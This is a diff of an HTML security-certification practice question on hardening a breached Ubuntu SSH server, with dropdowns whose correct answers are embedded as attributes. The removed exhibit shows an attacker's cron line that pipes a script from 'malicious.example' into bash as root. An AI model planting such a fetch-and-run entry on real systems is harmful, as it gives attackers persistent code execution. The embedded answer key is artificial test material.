@@ -1,21 +1,12 @@
-<article class="pbq-section-fragment" data-id="ubuntu-intro">
-      <header class="pbq-ssh-scenario">
+<article class="pbq-section-fragment" data-id="ubuntu-intro"><header class="pbq-ssh-scenario">
         <p class="pbq-ssh-scenario__eyebrow">Incident response · SY0-701 PBQ</p>
         <h1>Ubuntu 22.04 web server — post-breach hardening</h1>
         <p class="pbq-ssh-scenario__lead">
           A threat actor gained SSH access using brute-forced credentials. Forensics shows the attacker pivoted to
           root via a misconfigured sudo policy and established persistence with a malicious cron job. Harden all four
-          configuration areas in the folder — some fixes interact.
+          areas below — some fixes interact. Wrong changes in one file can break another control.
         </p>
       </header>
-
-      <figure class="pbq-ssh-exhibit" aria-labelledby="ubuntu-cron-exhibit">
-        <p id="ubuntu-cron-exhibit" class="pbq-ssh-exhibit__banner">IR ticket excerpt — attacker persistence (forensics)</p>
-        <div class="pbq-ssh-exhibit__body">
-          <pre class="pbq-ssh-cron-line"><code>*/5 * * * * root curl -s http://malicious.example/payload.sh | bash</code></pre>
-          <p class="pbq-ssh-exhibit__note">Malicious cron entry found in <code>/etc/cron.d/</code> — eradication still required after SSH hardening.</p>
-        </div>
-      </figure>
 
       <div class="pbq-ssh-score-row" aria-label="Section scores">
         <span class="pbq-ssh-score" id="score-sshd">sshd_config <strong>0</strong> / 7 pts</span>
@@ -24,8 +15,53 @@
         <span class="pbq-ssh-score" id="score-cq">Consequence Qs <strong>0</strong> / 4 pts</span>
       </div>
 
-      <p class="pbq-instructions">
-        Open each folder section (<strong>sshd_config</strong>, <strong>fail2ban</strong>, <strong>UFW</strong>,
-        <strong>Consequence Qs</strong>). <strong>Submit All &amp; Grade</strong> is on the last section.
-      </p>
-</article>
+      <div class="pbq-ssh-sim">
+        <div class="pbq-ssh-tabs" role="tablist" aria-label="Configuration areas">
+          <button type="button" class="pbq-ssh-tab active" role="tab" aria-selected="true" data-tab="sshd" id="tab-sshd">
+            <span class="pbq-ssh-tab__icon" aria-hidden="true">📄</span> sshd_config
+          </button>
+          <button type="button" class="pbq-ssh-tab" role="tab" aria-selected="false" data-tab="fail2ban" id="tab-fail2ban">
+            <span class="pbq-ssh-tab__icon" aria-hidden="true">📄</span> jail.local (fail2ban)
+          </button>
+          <button type="button" class="pbq-ssh-tab" role="tab" aria-selected="false" data-tab="ufw" id="tab-ufw">
+            <span class="pbq-ssh-tab__icon" aria-hidden="true">📄</span> UFW Rules
+          </button>
+          <button type="button" class="pbq-ssh-tab pbq-ssh-tab--warn" role="tab" aria-selected="false" data-tab="consequences" id="tab-consequences">
+            <span class="pbq-ssh-tab__icon" aria-hidden="true">⚠️</span> Consequence Qs
+          </button>
+        </div>
+
+        <div id="panel-sshd" class="pbq-ssh-panel active" role="tabpanel" aria-labelledby="tab-sshd">
+          <div class="pbq-ssh-editor">
+            <div class="pbq-ssh-editor__bar">
+              <span class="pbq-ssh-editor__path">/etc/ssh/sshd_config</span>
+              <span class="pbq-ssh-editor__hint">7 settings to fix — attacker used password auth + root login</span>
+            </div>
+            <pre class="pbq-ssh-code" aria-label="sshd_config"><code><span class="ln">1</span><span class="kw">Port</span> <select class="pbq-ssh-select" data-key="sshd-port" data-correct="4422" aria-label="Port">
+  <option value="">?</option><option>22</option><option>2222</option><option>4422</option>
+</select> <span class="cm"># attacker scanned default port — change it</span>
+<span class="ln">2</span><span class="kw">Protocol</span> <select class="pbq-ssh-select" data-key="sshd-protocol" data-correct="2" aria-label="Protocol">
+  <option value="">?</option><option>1</option><option>2</option><option>1,2</option>
+</select>
+<span class="ln">3</span><span class="kw">PermitRootLogin</span> <select class="pbq-ssh-select" data-key="sshd-root" data-correct="no" aria-label="PermitRootLogin">
+  <option value="">?</option><option>yes</option><option>no</option><option>prohibit-password</option><option>without-password</option>
+</select>
+<span class="ln">4</span><span class="kw">PasswordAuthentication</span> <select class="pbq-ssh-select" data-key="sshd-password" data-correct="no" aria-label="PasswordAuthentication">
+  <option value="">?</option><option>yes</option><option>no</option>
+</select> <span class="cm"># key vector of breach</span>
+<span class="ln">5</span><span class="kw">MaxAuthTries</span> <select class="pbq-ssh-select" data-key="sshd-maxauth" data-correct="3" aria-label="MaxAuthTries">
+  <option value="">?</option><option>10</option><option>6</option><option>3</option><option>1</option>
+</select>
+<span class="ln">6</span><span class="kw">LoginGraceTime</span> <select class="pbq-ssh-select" data-key="sshd-grace" data-correct="30" aria-label="LoginGraceTime">
+  <option value="">?</option><option>120</option><option>60</option><option>30</option>
+</select>
+<span class="ln">7</span><span class="kw">AllowUsers</span> <span class="val">webadmin deploy</span>
+<span class="ln">8</span><span class="kw">X11Forwarding</span> <select class="pbq-ssh-select" data-key="sshd-x11" data-correct="no" aria-label="X11Forwarding">
+  <option value="">?</option><option>yes</option><option>no</option>
+</select>
+<span class="ln">9</span><span class="kw">PubkeyAuthentication</span> <span class="val">yes</span>
+<span class="ln">10</span><span class="cm"># Require 2FA for non-key users</span>
+<span class="ln">11</span><span class="kw">AuthenticationMethods</span> <span class="val">publickey,keyboard-interactive</span></code></pre>
+            <p class="pbq-ssh-note">⚠️ Note: changing <code>Port</code> also requires updating the fail2ban jail port — they must match.</p>
+          </div>
+        </div><p class="pbq-instructions">Use each folder section for one config area. Grade on <strong>Consequence Qs</strong>.</p></article>
